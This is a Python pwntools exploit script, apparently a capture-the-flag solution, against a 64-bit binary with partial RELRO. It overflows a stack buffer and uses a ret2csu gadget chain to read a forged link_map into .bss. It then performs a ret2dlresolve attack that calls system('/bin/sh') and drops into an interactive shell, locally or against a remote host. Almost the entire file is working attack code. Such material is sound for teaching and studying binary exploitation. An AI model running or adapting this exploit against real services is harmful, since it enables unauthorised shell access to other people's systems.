from pwn import *

g_fname = args.FNAME if (args.FNAME) else "./main_partial_relro_64"
g_elf = ELF(g_fname)
g_libcname = args.LIB if (args.LIB) else "/usr/lib/x86_64-linux-gnu/libc-2.31.so"
g_libc = ELF(g_libcname)
context.binary = g_elf

if (args.LOCAL):
	g_io = process(g_fname)
else:
	h, p = args.RHOST.split(':')
	g_io = remote(h, p)

def getpid():
	if (args.LOCAL):
		log.info("pid:%d\n", g_io.proc.pid)
		pause()

def rop2read(buf, cnt):
	got_read = g_elf.got["read"]
	# mov %r15, %rdx; mov %r14, %rsi; mov %r13d, %edi;
	# callq *(%r12, %rbx, 8)
	# add $1, %rbx; cmp %rbx, %rbp; jne 0x400780;
	# add $8, %rsp; 
	# csu_end: ...
	addr_csu_front = 0x400780
	# pop %rbx; pop %rbp; pop %r12~%r15; ret
	addr_csu_end = 0x40079a
	payload = flat([
		addr_csu_end, 
		0, # rbx
		1, # rbp,
		got_read, # r12
		0, # r13->edi, 0 means read from stdin
		buf, # r14->rsi
		cnt, # r15->rdx
		addr_csu_front,
		p64(0) * 7
	])
	return payload

# typedef struct {
# 	Elf64_Sxword d_tag;
# 	union 
#	{
#		Elf64_Xword d_val;
#		Elf64_Addr d_ptr;
#	}
# } Elf64_Dyn;
# sizeof(Elf64_Dyn) = 0x10

# forge l_info[DT_STRTAB], l_info[DT_SYMTAB], l_info[DT_JMPREL]
def forge_link_map(link_map_addr, l_addr, got_known_func):
	align_mask = 2**64 - 1
	fake_Elf64_Dyn_symtab_addr = link_map_addr + 8 # l_info[DT_SYMTAB]
	fake_Elf64_Dyn_strtab_addr = link_map_addr + 0x18 # l_info[DT_STRTAB], we don't use it, just make it points to a READABLE area.
	fake_Elf64_Dyn_jmprel_addr = link_map_addr + 0x18 # l_info[DT_JMPREL]
	fake_Elf64_Rela_addr = link_map_addr + 0x28

	fake_Elf64_Dyn_symtab = flat([
		0, # d_tag. It should be DT_STRTAB, but 0 is ok.
		got_known_func - 8 # p_val. It will be interpreted as dynsym's sh_addr.
	])

	fake_Elf64_Dyn_jmprel = flat([0, fake_Elf64_Rela_addr])

	fake_Elf64_Rela = flat([
		(link_map_addr + 0x18 - l_addr) & align_mask, # r_offset, make (l_addr + r_offset) points to a WRITABLE area.
		7, # r_info, R_X86_64_JUMP_SLOT | (symidx << 32), symidx==0
		0  # r_addend
	])

	fake_link_map = flat([
		l_addr & align_mask,		# +0	
		fake_Elf64_Dyn_symtab,		# +0x8
		fake_Elf64_Dyn_jmprel,		# +0x18
		fake_Elf64_Rela,			# +0x28
		"/bin/sh\0".ljust(0x28), 	# +0x40
		fake_Elf64_Dyn_strtab_addr, # +0x68, DT_STRTAB
		fake_Elf64_Dyn_symtab_addr, # +0x70, DT_SYMTAB
		'a' * (0xf8 - 0x78),		# +0x78
		fake_Elf64_Dyn_jmprel_addr
	])

	return fake_link_map
	
def pwn():
	bss_addr = g_elf.bss()
	data_addr = bss_addr + 0x20
	binsh_addr = data_addr + 0x40
	func_name = "setbuf"
	l_addr = (g_libc.symbols["system"] - g_libc.symbols[func_name]) & (2**64 - 1)
	got_known_func = g_elf.got[func_name]
	log.debug("bss@%#x\n\tdata_addr=%#x\n\tl_addr=%#x\n\tgot of %s=%#x"
		, bss_addr
		, data_addr
		, l_addr
		, func_name, got_known_func
	)
	fake_link_map = forge_link_map(data_addr, l_addr, got_known_func)

	bof_padding = 'a'*0x78
	p_rdi = 0x4007a3	# pop rdi; ret
	vuln_addr = 0x400637
	# 1st ROP, prepare to read fake link map object to data_addr in .bss
	payload_1 = flat([
		bof_padding,
		rop2read(data_addr, len(fake_link_map)),
		vuln_addr
	])
	log.debug("len(payload_1) = %d", len(payload_1))
	assert(len(payload_1) <= 0x100)

	getpid()
	g_io.send(payload_1.ljust(0x100))

	g_io.send(fake_link_map)

	# 2nd ROP, ret2dlresolve use fake_link_map obj at data_addr.
	payload_2 = flat([
		bof_padding,
		p_rdi, binsh_addr,
		0x400506, # jmp to _dl_runtime_resolve
		data_addr, # fake_link_map_addr
		0, # fake reloc_arg
	])

	g_io.send(payload_2)

if ("__main__" == __name__):
	if (args.DEBUG):
		context.log_level = "debug"
	pwn()
	g_io.interactive()

